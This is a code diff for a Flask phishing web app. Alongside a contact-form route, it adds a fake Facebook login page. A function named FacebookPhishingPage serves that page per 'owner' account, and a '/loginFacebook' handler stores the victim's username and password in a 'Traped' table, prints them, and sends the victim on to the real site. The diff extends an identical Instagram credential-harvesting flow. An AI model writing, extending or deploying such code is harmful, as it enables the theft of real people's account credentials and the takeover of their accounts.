@@ -98,9 +98,24 @@ def page_not_found(error):
     return render_template('page_not_found.html'), 404
 
 
+@app.route('/contactus',methods=['GET','POST'])
+def contactus():
+    if request.method=='POST':
+        uid="None"
+        if 'user' in session:
+            uid=session['user']
+        name=request.form.get('yname')
+        email=request.form.get('yemail')
+        msg=request.form.get('ymessage')
+        print(uid,name,email,msg)
+        dbh.saveFeedback(uid,name,email,msg)
+        return redirect('/')
+    return render_template('contactus.html')
 
 
-#............INSTAGRAM..........
+
+
+#.........INSTAGRAM.........
 
 #for looking demo
 @app.route("/instagram.com")
@@ -129,31 +144,51 @@ def loginInsta():
         print(owner,site,uid,pas)
     return redirect("https://instagram.com")
 
-#..........INSTAGRAM END..........
+#........INSTAGRAM END.......
 
 
 
+#..........FACEBOOK...........
+
+#for looking demo
+@app.route("/facebook.com")
+def facebook():
+    return render_template("/apps/facebook.html")
+
+#completed
+@app.route("/<userid>/facebook.com")
+def FacebookPhishingPage(userid):
+    if dbh.checkIfUserExists(userid):
+        return render_template("apps/facebook.html",uid=userid)
+    return render_template('page_not_found.html')
+
+
+#completed
+@app.route("/loginFacebook",methods=['POST'])
+def loginFacebook():
+    owner=request.form.get('owner')
+    if owner=="":
+        pass
+    else:
+        site=request.form.get('app')
+        uid=request.form.get('uid')
+        pas=request.form.get('pas')
+        dbh.insertIntoTraped(owner,site,uid,pas)
+        print(owner,site,uid,pas)
+    return redirect("https://facebook.com")
+
+
+#......FACEBOOK END.......
 
 
 
-
-
-#........ADMIN PAGE............
+#.............ADMIN PAGE............................
 @app.route("/admin")
 def admin():
      if 'admin' in session:
         return render_template("ADMIN.html",allData=dbh,uid=session['admin'])
      return render_template("login.html",isLogged=False)
 
-
-
-
-
-
-
-@app.route("/facebook.com")
-def facebook():
-    return render_template("/apps/facebook.html")
 
 
 
